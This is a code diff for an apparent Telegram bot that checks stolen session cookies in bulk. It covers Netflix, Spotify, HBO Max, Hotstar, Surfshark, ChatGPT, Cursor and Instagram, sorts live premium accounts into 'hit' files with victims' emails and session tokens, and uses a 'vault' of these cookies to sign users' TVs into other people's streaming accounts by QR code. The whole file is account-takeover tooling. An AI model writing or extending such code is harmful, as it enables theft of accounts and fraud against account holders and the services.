+                f"{HBO_TV}  <b>Code    :</b> <code>{code}</code>\n\n"
+                f"<i>Your TV should now be logged in. {E_CHECK}</i>",
+                markup=main_markup("hbomax"),
+            )
+        else:
+            err_msgs = {
+                "invalid_code":      "Code not recognised — get a fresh code from hbomax.com/tvsignin.",
+                "expired_code":      "Code expired — get a new one from hbomax.com/tvsignin.",
+                "activation_failed": "Activation request failed. The cookie may be region-restricted.",
+            }
+            await safe_edit(msg,
+                f"{HBO_DEAD} <b>Activation failed.</b>\n\n"
+                f"<code>{err_msgs.get(status, status)}</code>",
+                markup=main_markup("hbomax"),
+            )
+        return
+
+    await message.answer(
+        f"Send a cookie file (<code>.txt</code> / <code>.json</code> / <code>.zip</code>) to check it.",
+        parse_mode="HTML", reply_markup=main_markup(mode),
+    )
+
+
+@router.message(F.photo)
+async def handle_photo(message: types.Message, bot: Bot):
+    uid     = message.from_user.id
+    chat_id = message.chat.id
+    r       = user_results[uid]
+
+    if not r.get("hs_awaiting_qr"):
+        return
+
+    user_results[uid]["hs_awaiting_qr"] = False
+    scanning_msg = await message.answer("🔍 <b>Scanning QR code…</b>", parse_mode="HTML")
+
+    try:
+        photo_file  = await message.photo[-1].get_file()
+        buf         = io.BytesIO()
+        await bot.download_file(photo_file.file_path, destination=buf)
+        image_bytes = buf.getvalue()
+
+        loop    = asyncio.get_event_loop()
+        qr_data = await loop.run_in_executor(None, scan_qr, image_bytes)
+
+        if not qr_data:
+            await safe_edit(scanning_msg,
+                "❌ <b>No QR code found in image.</b>\nSend a clearer photo of the TV screen.",
+                markup=main_markup("hotstar"))
+            hs_vault_record(False)
+            return
+
+        if not any(d in qr_data for d in ("hotstar.com", "jiohotstar.com")):
+            await safe_edit(scanning_msg,
+                "❌ <b>Not a JioHotstar QR code.</b>\n\n"
+                f"Decoded: <code>{qr_data[:100]}</code>\n\n"
+                "Only QR codes from hotstar.com / jiohotstar.com are supported.",
+                markup=main_markup("hotstar"))
+            hs_vault_record(False)
+            return
+
+        await safe_edit(scanning_msg, f"{E_GEAR} <b>QR decoded. Picking vault account…</b>")
+
+        cookie_info, err = hs_vault_pick_cookie()
+        if not cookie_info:
+            await safe_edit(scanning_msg,
+                f"❌ <b>No vault accounts available.</b>\n\n{err}\n\n"
+                f"Ask an admin to upload more via <b>{E_UPLOAD} Upload Vault</b>.",
+                markup=main_markup("hotstar"))
+            hs_vault_record(False)
+            return
+
+        use_count = hs_vault_get_use_count(cookie_info["filename"])
+        await safe_edit(scanning_msg,
+            f"{E_CHECK} <b>Account selected</b>  (usage: {use_count}/{HS_VAULT_MAX_USES})\n\n"
+            f"{SS_REVIVED} <b>Activating your TV…</b>")
+
+        success, act_msg = await loop.run_in_executor(
+            None, hs_vault_activate_qr, qr_data, cookie_info
+        )
+
+        if success:
+            new_use = hs_vault_increment_use(cookie_info["filename"])
+            hs_vault_record(True)
+            removed_notice = ""
+            if new_use >= HS_VAULT_MAX_USES:
+                try:
+                    os.remove(cookie_info["filepath"])
+                except Exception:
+                    pass
+                removed_notice = (
+                    f"\n\n{HS_DEVICE} <i>Account reached max uses ({HS_VAULT_MAX_USES}) "
+                    f"and was removed from vault.</i>"
+                )
+            qr_id = "N/A"
+            if "qr_code=" in qr_data:
+                try:
+                    qr_id = qr_data.split("qr_code=")[1].split("&")[0]
+                except Exception:
+                    pass
+            await safe_edit(scanning_msg,
+                f"╔══════════════════════════════╗\n"
+                f"║  {E_PARTY} <b>TV Activation Successful!</b>  ║\n"
+                f"╚══════════════════════════════╝\n\n"
+                f"{E_ID} QR ID : <code>{qr_id[:40]}</code>\n"
+                f"{E_STATS} Usage : {new_use}/{HS_VAULT_MAX_USES}\n\n"
+                f"<i>Your TV should now be connected. {E_CHECK}</i>"
+                f"{removed_notice}",
+                markup=main_markup("hotstar"))
+        else:
+            hs_vault_record(False)
+            await safe_edit(scanning_msg,
+                f"❌ <b>Activation failed.</b>\n\n"
+                f"<code>{act_msg}</code>\n\n"
+                f"Try scanning the QR code again or use a different account.",
+                markup=main_markup("hotstar"))
+
+    except Exception as e:
+        logger.exception("handle_photo error")
+        hs_vault_record(False)
+        await safe_edit(scanning_msg,
+            f"<b>Error:</b> <code>{str(e)[:200]}</code>",
+            markup=main_markup("hotstar"))
+
+
+@router.message(F.document)
+async def handle_file(message: types.Message, bot: Bot):
+    uid     = message.from_user.id
+    chat_id = message.chat.id
+    doc     = message.document
+    r       = user_results[uid]
+    mode    = r["mode"]
+
+    if not doc:
+        await message.answer("Please send a file.")
+        return
+    if r["processing"]:
+        await message.answer(f"{E_CLOCK} Already processing. Please wait.", parse_mode="HTML")
+        return
+
+    fname = doc.file_name or ""
+    ext   = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""
+
+    if r.get("nf_vault_upload") and ext == "zip":
+        user_results[uid]["nf_vault_upload"] = False
+        status_msg = await message.answer(f"{E_DOWN} <b>Downloading ZIP…</b>", parse_mode="HTML")
+        try:
+            tg_file  = await bot.get_file(doc.file_id)
+            zip_path = os.path.join(tempfile.gettempdir(), f"nf_vault_{uid}_{int(time.time())}.zip")
+            await bot.download_file(tg_file.file_path, destination=zip_path)
+            await safe_edit(status_msg, f"{E_FOLDER} <b>Extracting cookies into Netflix vault…</b>")
+            added, err = nf_vault_add_zip(zip_path)
+            try:
+                os.remove(zip_path)
+            except Exception:
+                pass
+            if err and added == 0:
+                await safe_edit(status_msg,
+                    f"❌ <b>Upload failed:</b> <code>{err}</code>",
+                    markup=main_markup("netflix"))
+            else:
+                await safe_edit(status_msg,
+                    f"✅ <b>Netflix Vault Updated!</b>\n\n"
+                    f"📦 Added  : <b>{added}</b> cookie file(s)\n"
+                    f"📂 Total  : <b>{nf_vault_count()}</b>",
+                    markup=main_markup("netflix"))
+        except Exception as e:
+            await safe_edit(status_msg,
+                f"<b>Error during upload:</b> <code>{str(e)[:200]}</code>",
+                markup=main_markup("netflix"))
+        return
+
+    if r.get("hs_vault_upload") and ext == "zip":
+        user_results[uid]["hs_vault_upload"] = False
+        status_msg = await message.answer(f"{E_DOWN} <b>Downloading ZIP…</b>", parse_mode="HTML")
+        try:
+            tg_file  = await bot.get_file(doc.file_id)
+            zip_path = os.path.join(tempfile.gettempdir(), f"hs_vault_{uid}_{int(time.time())}.zip")
+            await bot.download_file(tg_file.file_path, destination=zip_path)
+            await safe_edit(status_msg, f"{E_FOLDER} <b>Extracting cookies into vault…</b>")
+            added, err = hs_vault_add_zip(zip_path)
+            try:
+                os.remove(zip_path)
+            except Exception:
+                pass
+            if err and added == 0:
+                await safe_edit(status_msg,
+                    f"❌ <b>Upload failed:</b> <code>{err}</code>",
+                    markup=main_markup("hotstar"))
+            else:
+                await safe_edit(status_msg,
+                    f"✅ <b>Vault updated!</b>\n\n"
+                    f"📦 Added : <b>{added}</b> cookie file(s)\n"
+                    f"📂 Total  : <b>{hs_vault_count()}</b>\n"
+                    f"🟢 Available: <b>{hs_vault_available_count()}</b>",
+                    markup=main_markup("hotstar"))
+        except Exception as e:
+            await safe_edit(status_msg,
+                f"<b>Error during upload:</b> <code>{str(e)[:200]}</code>",
+                markup=main_markup("hotstar"))
+        return
+
+    if ext not in ("txt", "json", "zip"):
+        await message.answer(
+            f"Unsupported format. Send <code>.txt</code>, <code>.json</code>, or <code>.zip</code>.",
+            parse_mode="HTML",
+        )
+        return
+    if doc.file_size > MAX_FILE_SIZE:
+        await message.answer(f"File too large. Max: {MAX_FILE_SIZE // 1024 // 1024} MB.", parse_mode="HTML")
+        return
+
+    user_results[uid]["processing"] = True
+    status_msg = await message.answer(f"{E_DOWN} <b>Downloading file…</b>", parse_mode="HTML")
+    temp_path  = None
+
+    try:
+        tg_file   = await bot.get_file(doc.file_id)
+        temp_path = os.path.join(tempfile.gettempdir(), f"{mode}_{uid}_{int(time.time())}_{fname}")
+        await bot.download_file(tg_file.file_path, destination=temp_path)
+
+        if ext == "zip":
+            await safe_edit(status_msg, f"{E_FOLDER} <b>Extracting ZIP…</b>")
+            files_to_check = extract_zip_cookies(temp_path, prefix=mode)
+            if not files_to_check:
+                await safe_edit(status_msg, "No valid cookie files found in ZIP.")
+                user_results[uid]["processing"] = False
+                return
+        else:
+            files_to_check = [temp_path]
+
+        total = len(files_to_check)
+        await safe_edit(status_msg,
+            f"{E_GEAR} <b>Checking {total} cookie(s) via {SERVICES[mode]}…</b>\n"
+            f"Using <b>{MAX_WORKERS}</b> parallel workers.",
+        )
+
+        if mode == "netflix" and r.get("nf_sub") == "clean":
+            await safe_edit(status_msg, f"{SP_SPARK}  <b>Cleaning &amp; deduplicating cookies…</b>")
+            try:
+                raw_text = open(temp_path, "r", encoding="utf-8", errors="ignore").read() \
+                           if ext != "zip" else \
+                           "\n".join(open(fp, "r", encoding="utf-8", errors="ignore").read()
+                                     for fp in files_to_check)
+                zip_buf, valid = nf_clean_cookies_to_zip(raw_text)
+                if not zip_buf or valid == 0:
+                    await safe_edit(status_msg,
+                        f"{SP_DEAD} <b>No valid Netflix cookies found.</b>\nCheck your file format.",
+                        markup=main_markup("netflix"))
+                    user_results[uid]["processing"] = False
+                    return
+                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                await safe_edit(status_msg,
+                    f"{SP_SPARK}  <b>Done!</b>  Found <b>{valid}</b> unique cookie(s).")
+                await bot.send_document(
+                    chat_id,
+                    document=BufferedInputFile(zip_buf.getvalue(), filename=f"netflix_clean_{ts}.zip"),
+                    caption=(f"{SP_PREMIUM} <b>Netflix Clean Cookies</b>\n\n"
+                             f"{E_COUNT} Valid / unique: <b>{valid}</b>\n"
+                             f"Format: Netscape .txt (one file per cookie)"),
+                    parse_mode="HTML", reply_markup=main_markup("netflix"))
+            except Exception as e:
+                await safe_edit(status_msg, f"<b>Clean error:</b> <code>{str(e)[:200]}</code>")
+            user_results[uid]["processing"] = False
+            return
+
+        if mode == "surfshark":
+            await _run_surfshark(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "spotify":
+            await _run_spotify(uid, chat_id, total, files_to_check, ext, temp_path, status_msg, bot)
+        elif mode == "hotstar":
+            await _run_hotstar(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "hbomax":
+            await _run_hbomax(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "chatgpt":
+            await _run_chatgpt(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "cursor":
+            await _run_cursor(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "instagram":
+            await _run_instagram(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        elif mode == "scan":
+            await _run_scan(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+        else:
+            await _run_netflix(uid, chat_id, total, files_to_check, ext, status_msg, bot)
+
+        for fp in files_to_check:
+            try:
+                if fp != temp_path and os.path.exists(fp):
+                    os.remove(fp)
+            except Exception:
+                pass
+
+    except Exception as e:
+        logger.exception("handle_file error")
+        await safe_edit(status_msg, f"<b>Error:</b> <code>{str(e)[:200]}</code>")
+        user_results[uid]["processing"] = False
+    finally:
+        if temp_path and os.path.exists(temp_path):
+            try:
+                os.remove(temp_path)
+            except Exception:
+                pass
+
+
+# ── Per-service bulk runners ──────────────────────────────────────────────────
+
+async def _run_chatgpt(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    premium = []; free = []; dead = []
+    processed = 0; last_edit = 0.0; start_t = time.monotonic()
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, cg_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
+
+            s = result.get("status")
+            if s == "PREMIUM":
+                premium.append(result)
+                await bot.send_message(chat_id, cg_fmt_premium(result), parse_mode="HTML")
+            elif s == "FREE":
+                free.append(result)
+            else:
+                dead.append(result)
+
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, cg_fmt_progress(
+                        processed, total, len(premium), len(free), len(dead)))
+
+    elapsed = time.monotonic() - start_t
+    user_results[uid].update({
+        "cg_premium": premium, "cg_free": free, "cg_dead": dead,
+        "cg_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (premium or free or dead)[0]
+        await safe_edit(status_msg, cg_fmt_single(only), markup=main_markup("chatgpt"))
+    else:
+        await safe_edit(status_msg,
+            cg_fmt_summary(len(premium), len(free), len(dead), total, elapsed),
+            markup=main_markup("chatgpt"))
+        if premium:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                for idx, hit in enumerate(premium, 1):
+                    email_slug = re.sub(r"[^\w\-_]", "_", hit.get("email", "unk").split("@")[0])
+                    body = (
+                        f"Name    : {hit.get('name','Unknown')}\n"
+                        f"Email   : {hit.get('email','Unknown')}\n"
+                        f"Plan    : {hit.get('plan_upper','Unknown')}\n"
+                        f"Expires : {hit.get('expiration','Unknown')}\n\n"
+                        f"Cookies (Netscape):\n"
+                        f"{cg_format_cookie_netscape('__Secure-next-auth.session-token.0', hit.get('cookie_0',''))}\n"
+                        f"{cg_format_cookie_netscape('__Secure-next-auth.session-token.1', hit.get('cookie_1',''))}\n"
+                    )
+                    zf.writestr(f"premium/{email_slug}.txt", body)
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            await bot.send_document(
+                chat_id,
+                document=BufferedInputFile(buf.getvalue(), filename=f"chatgpt_hits_{ts}.zip"),
+                caption=f"{CG_PREMIUM} <b>{len(premium)} ChatGPT premium hit(s)</b>",
+                parse_mode="HTML", reply_markup=main_markup("chatgpt"),
+            )
+
+
+async def _run_cursor(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    pro = []; free = []; dead = []
+    processed = 0; last_edit = 0.0; start_t = time.monotonic()
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, cursor_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "INVALID", "reason": str(e)[:50], "filename": "?"}
+
+            s = result.get("status")
+            if s == "PRO":
+                pro.append(result)
+                await bot.send_message(chat_id, cur_fmt_pro(result), parse_mode="HTML")
+            elif s == "FREE":
+                free.append(result)
+            else:
+                dead.append(result)
+
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, cur_fmt_progress(
+                        processed, total, len(pro), len(free), len(dead)))
+
+    elapsed = time.monotonic() - start_t
+    user_results[uid].update({
+        "cur_pro": pro, "cur_free": free, "cur_dead": dead,
+        "cur_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (pro or free or dead)[0]
+        await safe_edit(status_msg, cur_fmt_single(only), markup=main_markup("cursor"))
+    else:
+        await safe_edit(status_msg,
+            cur_fmt_summary(total, len(pro), len(free), len(dead), elapsed),
+            markup=main_markup("cursor"))
+        if pro:
+            buf = io.BytesIO()
+            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                for idx, hit in enumerate(pro, 1):
+                    email_slug = re.sub(r"[^\w\-_]", "_", hit.get("email", "unk").split("@")[0])
+                    body = (
+                        f"Name  : {hit.get('name','Unknown')}\n"
+                        f"Email : {hit.get('email','Unknown')}\n"
+                        f"Plan  : {hit.get('plan','Unknown')}\n"
+                        f"Tier  : {hit.get('tier','Unknown')}\n\n"
+                        f"Token : {hit.get('full_token','')}\n"
+                    )
+                    zf.writestr(f"pro/{email_slug}.txt", body)
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            await bot.send_document(
+                chat_id,
+                document=BufferedInputFile(buf.getvalue(), filename=f"cursor_hits_{ts}.zip"),
+                caption=f"{CUR_PRO} <b>{len(pro)} Cursor PRO hit(s)</b>",
+                parse_mode="HTML", reply_markup=main_markup("cursor"),
+            )
+
+
+async def _run_instagram(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    live = []; dead = []
+    processed = 0; last_edit = 0.0; start_t = time.monotonic()
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, ig_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "INVALID", "reason": str(e)[:50], "filename": "?"}
+
+            if result.get("status") == "LIVE":
+                live.append(result)
+                await bot.send_message(chat_id, ig_fmt_live(result), parse_mode="HTML")
+            else:
+                dead.append(result)
+
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    pct = processed / total
+                    filled = int(pct * 10)
+                    bar = "█" * filled + "░" * (10 - filled)
+                    await safe_edit(status_msg,
+                        f"{IG_EMOJI} <b>Instagram Checker</b>\n\n"
+                        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+                        f"{IG_LIVE} Live : <b>{len(live)}</b>\n"
+                        f"{IG_DEAD} Dead : <b>{len(dead)}</b>\n"
+                        f"{E_FILE} Checked : <b>{processed}/{total}</b>")
+
+    elapsed = time.monotonic() - start_t
+    user_results[uid].update({
+        "ig_live": live, "ig_dead": dead,
+        "ig_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (live or dead)[0]
+        await safe_edit(status_msg, ig_fmt_single(only), markup=main_markup("instagram"))
+    else:
+        await safe_edit(status_msg,
+            f"{E_CHECK} <b>Instagram Check Complete!</b>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{E_COUNT} Total : <b>{total}</b>\n"
+            f"{IG_LIVE} Live  : <b>{len(live)}</b>\n"
+            f"{IG_DEAD} Dead  : <b>{len(dead)}</b>\n"
+            f"{E_CLOCK} Time  : <b>{elapsed:.1f}s</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━",
+            markup=main_markup("instagram"))
+
+
+async def _run_scan(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    live_hits = []; dead_hits = []
+    processed = 0; last_edit = 0.0; start_t = time.monotonic()
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, scan_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"error": str(e)[:60], "filename": "?"}
+
+            if "error" in result:
+                dead_hits.append(result)
+                processed += 1
+                continue
+
+            for service, sres in result.get("results", {}).items():
+                if sres.get("status") == "LIVE":
+                    hit = {
+                        "service":  service,
+                        "username": sres.get("username"),
+                        "filename": result.get("filename"),
+                        "content":  result.get("content", ""),
+                    }
+                    live_hits.append(hit)
+
+            processed += 1
+
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, scan_fmt_progress(
+                        processed, total, len(live_hits), len(dead_hits)))
+
+            if total == 1:
+                await safe_edit(status_msg, scan_fmt_result(result),
+                                markup=main_markup("scan"))
+
+    elapsed = time.monotonic() - start_t
+    user_results[uid].update({
+        "scan_live": live_hits, "scan_dead": dead_hits,
+        "scan_total": total, "processing": False,
+    })
+
+    if total > 1:
+        await safe_edit(status_msg,
+            f"{E_CHECK} <b>Cookie Scanner Complete!</b>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"{E_COUNT} Files : <b>{total}</b>\n"
+            f"{SCAN_LIVE} Live  : <b>{len(live_hits)}</b>\n"
+            f"{SCAN_DEAD} Dead  : <b>{len(dead_hits)}</b>\n"
+            f"{E_CLOCK} Time  : <b>{elapsed:.1f}s</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━",
+            markup=main_markup("scan"))
+
+    if live_hits:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            seen_files = set()
+            for hit in live_hits:
+                srv = hit["service"]
+                fname = hit["filename"]
+                key = f"{srv}_{fname}"
+                if key in seen_files:
+                    continue
+                seen_files.add(key)
+                zf.writestr(f"{srv}/{fname}", hit["content"])
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        await bot.send_document(
+            chat_id,
+            document=BufferedInputFile(buf.getvalue(), filename=f"scanner_live_{ts}.zip"),
+            caption=f"{SCAN_LIVE} <b>{len(live_hits)} live cookie file(s)</b>",
+            parse_mode="HTML", reply_markup=main_markup("scan"),
+        )
+
+
+async def _run_hbomax(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    live_list = []; dead_list = []
+    processed = 0; last_edit = 0.0; start_time = time.time()
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, hbo_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
+
+            if result.get("status") == "LIVE":
+                live_list.append(result)
+            else:
+                dead_list.append(result)
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    pct = f"{len(live_list)/processed*100:.0f}" if processed else "0"
+                    await safe_edit(status_msg,
+                        f"{HBO_ICON} <b>Checking HBO Max cookies…</b>\n\n"
+                        f"{E_COUNT} Progress : <b>{processed}/{total}</b>\n"
+                        f"{HBO_LIVE} Live     : <b>{len(live_list)}</b>  ({pct}%)\n"
+                        f"{HBO_DEAD} Dead     : <b>{len(dead_list)}</b>")
+
+    elapsed = time.time() - start_time
+    user_results[uid].update({
+        "hbo_live": live_list, "hbo_dead": dead_list,
+        "hbo_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (live_list or dead_list)[0]
+        await safe_edit(status_msg, hbo_fmt_single(only), markup=main_markup("hbomax"))
+    else:
+        await safe_edit(status_msg,
+            hbo_fmt_summary(total, len(live_list), len(dead_list), elapsed),
+            markup=main_markup("hbomax"))
+        if live_list:
+            lines = [f"HBO Max Live Hits — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'=' * 50}\n"]
+            for idx, res in enumerate(live_list, 1):
+                lines.append(
+                    f"HIT #{idx:03d}\n"
+                    f"Email   : {res.get('email','?')}\n"
+                    f"Country : {res.get('country','?')}\n"
+                    f"Region  : {res.get('region','?').upper()}\n"
+                    f"File    : {res.get('filename','?')}\n{'─'*40}\n"
+                )
+            tmp = tempfile.mktemp(suffix=".txt")
+            try:
+                with open(tmp, "w") as f:
+                    f.write("\n".join(lines))
+                await bot.send_document(
+                    chat_id,
+                    document=FSInputFile(tmp, filename=f"hbomax_hits_{int(time.time())}.txt"),
+                    caption=f"{HBO_LIVE} <b>{len(live_list)} HBO Max live hit(s)</b>",
+                    parse_mode="HTML", reply_markup=main_markup("hbomax"),
+                )
+            finally:
+                try:
+                    os.remove(tmp)
+                except Exception:
+                    pass
+
+
+async def _run_surfshark(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    premium_list = []; free_list = []; dead_list = []
+    processed = revived_n = 0; last_edit = 0.0
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, ss_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "DEAD", "reason": str(e)[:50], "filename": "?", "content": ""}
+
+            status = result.get("status")
+            if status == "PREMIUM":
+                premium_list.append(result)
+                if result.get("revived"):
+                    revived_n += 1
+                slug = re.sub(r"[^\w\-_]", "_", result.get("email", "unk").split("@")[0])
+                with open(os.path.join("ss_premium", f"{slug}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(result.get("content", ""))
+            elif status == "FREE":
+                free_list.append(result)
+                slug = re.sub(r"[^\w\-_]", "_", result.get("email", "unk").split("@")[0])
+                with open(os.path.join("ss_free", f"free_{slug}_{int(time.time())}.txt"), "w") as fh:
+                    fh.write(result.get("content", ""))
+            else:
+                dead_list.append(result)
+            processed += 1
+            if total > 1:
+                now = time.monotonic()
+                if now - last_edit >= 2.0:
+                    last_edit = now
+                    await safe_edit(status_msg, ss_fmt_progress(processed, total, len(premium_list), len(free_list), len(dead_list), revived_n))
+
+    user_results[uid].update({
+        "ss_premium": premium_list, "ss_free": free_list,
+        "ss_dead": dead_list, "ss_total": total, "processing": False,
+        "ss_awaiting_code": False, "ss_login_data": None,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (premium_list or free_list or dead_list)[0]
+        await safe_edit(status_msg, ss_fmt_single(only), markup=main_markup("surfshark"))
+    else:
+        await safe_edit(status_msg,
+            ss_fmt_summary(total, len(premium_list), len(free_list), len(dead_list), revived_n),
+            markup=main_markup("surfshark"),
+        )
+        if premium_list:
+            ts_str  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            divider = "═" * 50
+            lines   = ["Surfshark Premium Hit Report", divider,
+                       f"Generated  : {ts_str}", f"Premium    : {len(premium_list)}",
+                       f"Revived    : {revived_n}", divider, ""]
+            for i, res in enumerate(premium_list, 1):
+                lines += [f"HIT #{i:03d}",
+                          f"  Email    : {res.get('email','?')}",
+                          f"  Plan     : {res.get('plan','?')}",
+                          f"  Expiry   : {res.get('expires_at','?')}",
+                          f"  Days     : {res.get('days_left','?')} days",
+                          f"  Price    : {res.get('price','?')}",
+                          f"  Country  : {res.get('country','?')}",
+                          f"  Revived  : {'Yes' if res.get('revived') else 'No'}",
+                          f"  File     : {res.get('filename','?')}", ""]
+            lines.append(divider)
+            data = "\n".join(lines).encode()
+            await bot.send_document(
+                chat_id,
+                document=BufferedInputFile(data, filename=f"ss_hits_{datetime.now():%Y%m%d_%H%M%S}.txt"),
+                caption=f"📄 <b>Surfshark Hit Report</b> — {len(premium_list)} premium",
+                parse_mode="HTML",
+            )
+        if GC_STORE_CHAT_ID and premium_list:
+            await _gc_store_ss(bot, premium_list)
+
+
+async def _run_spotify(uid, chat_id, total, files, ext, temp_path, status_msg, bot: Bot):
+    premium_list = []; free_list = []; dead_list = []
+    start_time = time.time(); processed = 0
+    UPDATE_EVERY = max(1, total // 20)
+    loop = asyncio.get_event_loop()
+
+    for i, fpath in enumerate(files, 1):
+        result = await loop.run_in_executor(None, sp_check_file, fpath)
+        if fpath != temp_path:
+            try:
+                os.remove(fpath)
+            except Exception:
+                pass
+        status = result.get("status")
+        if status == "PREMIUM":
+            premium_list.append(result)
+            name = re.sub(r"[^\w\-.]", "_", result.get("filename", "c")) or "c.txt"
+            with open(os.path.join("sp_premium", name), "w") as fh:
+                fh.write(result.get("content", ""))
+        elif status == "FREE":
+            free_list.append(result)
+            name = re.sub(r"[^\w\-.]", "_", result.get("filename", "c")) or "c.txt"
+            with open(os.path.join("sp_free", name), "w") as fh:
+                fh.write(result.get("content", ""))
+        else:
+            dead_list.append(result)
+        processed += 1
+        user_results[uid]["sp_total"] += 1
+        if processed % UPDATE_EVERY == 0 or processed == total:
+            await safe_edit(status_msg, sp_fmt_progress(processed, total, len(premium_list), len(free_list), len(dead_list)))
+
+    elapsed = time.time() - start_time
+    user_results[uid].update({
+        "sp_premium": premium_list, "sp_free": free_list,
+        "sp_dead": dead_list, "sp_total": total, "processing": False,
+    })
+
+    if ext != "zip" and total == 1:
+        only = (premium_list or free_list or dead_list)[0]
+        await safe_edit(status_msg, sp_fmt_premium(only) if only["status"] == "PREMIUM" else
+                        (sp_fmt_free(only) if only["status"] == "FREE" else sp_fmt_dead(only)),
+                        markup=main_markup("spotify"))
+    else:
+        await safe_edit(status_msg,
+            sp_fmt_summary(len(premium_list), len(free_list), len(dead_list), total, elapsed),
+            markup=main_markup("spotify"),
+        )
+        if premium_list:
+            lines = [f"Spotify Premium Hits — {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'=' * 50}\n"]
+            for idx, res in enumerate(premium_list, 1):
+                lines.append(f"HIT #{idx:03d}\nPlan    : {res.get('plan','?')}\nEmail   : {res.get('email','?')}\nCountry : {res.get('country','?')}\nFile    : {res.get('filename','?')}\n{'─' * 40}\n")
+            tmp = tempfile.mktemp(suffix=".txt")
+            try:
+                with open(tmp, "w") as f:
+                    f.write("\n".join(lines))
+                await bot.send_document(
+                    chat_id,
+                    document=FSInputFile(tmp, filename=f"sp_hits_{int(time.time())}.txt"),
+                    caption=f"{SP_PREMIUM}  <b>{len(premium_list)} Spotify Premium hit(s)</b>",
+                    parse_mode="HTML", reply_markup=main_markup("spotify"),
+                )
+            finally:
+                try:
+                    os.remove(tmp)
+                except Exception:
+                    pass
+        if GC_STORE_CHAT_ID and premium_list:
+            await _gc_store_sp(bot, premium_list)
+
+
+async def _run_hotstar(uid, chat_id, total, files, ext, status_msg, bot: Bot):
+    live_list = []; device_list = []; free_list = []; inv_list = []
+    processed = last_edit = 0.0; live_hit_n = dev_hit_n = 0
+    loop = asyncio.get_event_loop()
+
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        futures = [loop.run_in_executor(executor, hs_check_file, fp) for fp in files]
+        for coro in asyncio.as_completed(futures):
+            try:
+                result = await coro
+            except Exception as e:
+                result = {"status": "INVALID", "reason": str(e)[:50], "filename": "?"}
+
+            status = result.get("status", "INVALID")
+            if status == "LIVE":
+                live_hit_n += 1; result["hit_num"] = live_hit_n
+                live_list.append(result)
